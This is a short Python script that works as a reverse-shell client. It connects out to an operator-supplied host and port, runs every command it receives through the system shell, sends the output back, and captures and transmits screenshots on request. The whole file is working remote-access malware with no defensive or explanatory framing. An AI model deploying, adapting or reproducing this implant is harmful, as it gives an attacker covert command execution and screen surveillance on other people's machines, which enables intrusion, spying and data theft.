# Host and Port need to be entered here

host = ""
port = 

import socket
import os
import subprocess
import pyscreenshot

path_main = os.getcwd()
path_temp = os.path.join(path_main, 'temp.png')

s = socket.socket()


s.connect((host, port))

while True:
    data = s.recv(1024)
    if data.decode("utf-8") == 'quit':
        s.close()
        break
    if data.decode("utf-8") == 's':
        temp = pyscreenshot.grab()
        temp.save(path_temp)
        # Reading and sending file as a binary file
        input_file = open(path_temp, 'rb')
        inputstream = input_file.read()
        s.send(str.encode(str(len(inputstream))))
        while(str(s.recv(2048),"utf-8") != 'Ready_to_recv_ss') :
            pass
        s.send(inputstream)
        input_file.close()
        response=s.recv(1024)
        s.send(str.encode(os.getcwd() + "> "))
        continue
    if data[:2].decode("utf-8") == 'cd' :
        os.chdir(data[3:].decode("utf-8"))
    if(len(data) > 0):
        execution_cmd = subprocess.Popen(data.decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_cmd_byte = execution_cmd.stdout.read() + execution_cmd.stderr.read()    # Byte Format
        output_cmd_str = str(output_cmd_byte,"utf-8")
        s.send(str.encode(output_cmd_str + os.getcwd() + "> "))
    
